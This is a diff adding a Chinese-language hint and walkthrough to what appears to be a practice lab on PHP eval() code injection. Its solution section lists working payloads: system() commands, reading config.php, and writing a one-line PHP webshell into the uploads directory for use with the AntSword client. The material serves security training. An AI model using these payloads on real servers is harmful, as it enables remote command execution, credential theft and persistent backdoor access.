@@ -1,0 +1,18 @@
+<div class="hint-thought">
+<h4>思路提示</h4>
+<p>代码执行的核心是输入被 <code>eval()</code> 直接执行，相当于拿到了 PHP 的完整能力。思路：先跑个简单表达式（如 <code>1+1</code>、<code>phpinfo()</code>）确认能执行，再尝试 <code>system()</code> 执行系统命令、<code>file_get_contents()</code> 读文件，最后用 <code>file_put_contents()</code> 写入 WebShell 到 uploads 目录。</p>
+</div>
+<details class="hint-detail">
+<summary>详细解题过程（点击展开）</summary>
+<div>
+<b>基础：</b><br>
+<code>echo 1+1;</code><br>
+<code>phpinfo();</code><br>
+<code>system('whoami');</code><br>
+<code>system('ipconfig');</code><br>
+<b>读文件：</b><code>echo file_get_contents('../../config.php');</code><br>
+<b>写 WebShell：</b><br>
+<code>file_put_contents('../../uploads/eval_shell.php','&lt;?php @eval($_POST["cmd"]);?&gt;');echo 'ok';</code><br>
+写完后访问 <code><?php echo BASE_URL; ?>/uploads/eval_shell.php</code> 并用蚁剑连接。
+</div>
+</details>
